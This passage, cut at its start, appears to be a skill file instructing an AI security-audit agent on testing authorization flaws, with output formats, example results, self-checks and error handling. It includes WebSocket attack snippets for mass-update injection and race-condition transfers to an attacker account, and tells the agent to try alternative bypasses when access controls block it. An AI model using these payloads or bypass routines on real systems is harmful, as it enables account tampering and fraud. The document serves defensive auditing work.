    "content": "Forged message"
}));
```

#### Step 5: Batch Operation Injection
```javascript
// Normal: update single record
ws.send(JSON.stringify({
    "action": "update",
    "id": 1,
    "status": "active"
}));

// Attack: inject batch conditions
ws.send(JSON.stringify({
    "action": "update",
    "where": {"role": "user"},  // update all regular users
    "status": "banned"
}));
```

#### Step 6: WebSocket + Race Condition
```javascript
// Rapidly send multiple messages to exploit race conditions and bypass checks
for (let i = 0; i < 100; i++) {
    ws.send(JSON.stringify({
        "action": "transfer",
        "amount": 1000,
        "to": "attacker_account"
    }));
}
```

### Key Insight

> WebSocket message handling typically lacks the same level of input validation and authorization checks as HTTP endpoints. Developers tend to trust messages from established connections, neglecting message-level field filtering and permission verification. **Each WebSocket message MUST undergo the same input validation (whitelist fields), authorization checks (verify operation permissions), and rate limiting as HTTP requests**. Channel subscription MUST be validated server-side and MUST NOT rely on client-side declarations.



## Output Contract

| Output File | Path | Description |
|-------------|------|-------------|
| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | Final verdict + all round records |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |

## Examples

### ✅ GOOD Example — Complete, Valid Exploit Result

```json
{
  "sink_id": "authz_admin_panel_001",
  "final_verdict": "confirmed",
  "rounds_executed": 4,
  "successful_round": 1,
  "payload": "GET /admin/users with regular user session cookie",
  "evidence_result": "200 OK with full admin user list returned to regular user, IDOR confirmed",
  "severity": {
    "level": "C",
    "score": 2.7,
    "cvss": 9.0
  }
}
```

**Why this is good:**
- `evidence_result` contains specific, verifiable proof of exploitation
- `severity` scoring is consistent: score 2.7 → cvss 9.0 → level `C`
- `rounds_executed` shows progressive effort, not a single blind attempt
- All required fields are populated with concrete values

### ❌ BAD Example — Incomplete, Invalid Exploit Result

```json
{
  "sink_id": "authz_admin_panel_001",
  "final_verdict": "confirmed",
  "rounds_executed": 1,
  "successful_round": 1,
  "payload": "GET /admin",
  "evidence_result": "",
  "failure_reason": "",
  "severity": {
    "level": "M",
    "score": null
  }
}
```

**Issues:**
- evidence_result is empty — no response body proving unauthorized access
- failure_reason is empty — no detail about access control bypass
- severity_level 'M' for confirmed admin panel access bypass — should be C or H

---

## Pre-submission Self-check (MUST Execute)

After completing exploit JSON writing, perform item-by-item self-check per `shared/auditor_self_check.md`:

1. Execute generic 8 items (G1-G8); proceed only after all ✅
2. Execute specialized self-check below (S1-S3); submit only after all ✅
3. Any item ❌ → Fix and re-check; MUST NOT skip

### Specialized Self-check (AuthZ Auditor Specific)
- [ ] S1: Specific middleware/decorators with missing permission checks have been annotated
- [ ] S2: Horizontal comparison (permission differences across routes with the same functionality) has been performed
- [ ] S3: Complete steps for role escalation paths have been listed

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Access control rule blocks privilege escalation attempt | Switch to alternative bypass vector (parameter tampering, IDOR, forced browsing); if all blocked → record `"status": "access_control_enforced"` |
| Role/permission context unavailable | Re-read auth_credentials.json for role mappings, retry with correct privilege context |
| Authentication token expired mid-attack | Re-fetch credentials from auth_credentials.json, retry current round |
